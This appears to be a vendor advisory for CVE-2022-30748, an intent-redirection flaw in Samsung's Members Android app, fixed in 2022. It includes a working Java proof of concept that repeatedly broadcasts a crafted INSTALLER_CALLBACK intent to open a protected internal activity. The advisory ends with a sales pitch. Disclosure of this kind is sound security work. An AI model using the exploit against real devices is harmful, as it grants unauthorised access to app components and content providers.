# Details

<table>
    <tr>
        <td>Name</td>
        <td>Samsung Members</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.voc</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.04.19</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.06.30</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-30748">CVE-2022-30748</a> (SVE-2022-0975)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$1600</td>
    </tr>
</table>

# Description

Oversecured report:
![](Oversecured_report.png)

Oversecured found dynamic registration of an unprotected receiver with the `INSTALLER_CALLBACK` action. When processing a broadcast, it received the `android.intent.extra.INTENT` parameter from the attacker and passed it to `Context.startActivity()`. This led to access to arbitrary activities and content providers with the flag `android:grantUriPermissions="true"`.

**Proof of Concept**

```java
new Thread(() -> {
    Intent next = new Intent();
    next.setClassName("com.samsung.android.voc", "com.samsung.consent.carta.WebAppActivity");
    next.putExtra("url", "http://example.com/");

    Intent i = new Intent("INSTALLER_CALLBACK");
    i.putExtra("android.content.pm.extra.STATUS", -1);
    i.putExtra("android.intent.extra.INTENT", next);
    while (true) {
        sendBroadcast(i);
        try {
            Thread.sleep(100);
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }
}).start();
```

## References

- [Oversecured Blog. Android: Access to app protected components](https://blog.oversecured.com/Android-Access-to-app-protected-components/)
- [Oversecured Blog. Gaining access to arbitrary* Content Providers](https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers/)

## Conclusion

Mobile app security is more critical than ever in today's digital landscape. As we have shown through our research, even the most reputable brands are not immune to the threat of cyberattacks. 

At Oversecured, we are committed to help our clients stay ahead of the curve with our industry-leading mobile app vulnerability scanning technology. With our comprehensive approach to mobile app security, you can trust that your brand and your users are protected from data breaches and other security threats.

Don't wait until it's too late. [Get a free consultation](https://oversecured.com/contact-us?utm_source=github&utm_medium=article&utm_campaign=samsung2022) and find out how we can help secure your mobile apps. Together, we can build a safer digital world.